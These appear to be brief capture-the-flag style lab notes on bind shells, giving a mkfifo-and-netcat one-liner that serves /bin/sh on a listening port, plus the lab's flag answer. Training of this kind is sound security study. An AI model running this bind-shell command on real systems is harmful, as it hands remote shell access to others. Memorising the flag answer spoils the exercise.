# Module 115 — Shells & Payloads
## Bind Shells

Created a bind shell using `mkfifo` + netcat:
```bash
mkfifo /tmp/f
/bin/sh -i < /tmp/f 2>&1 | nc -lvp <port> > /tmp/f
```
Connected to it from the attacker side.

**Flag:** `B1nD_Shells_r_cool`
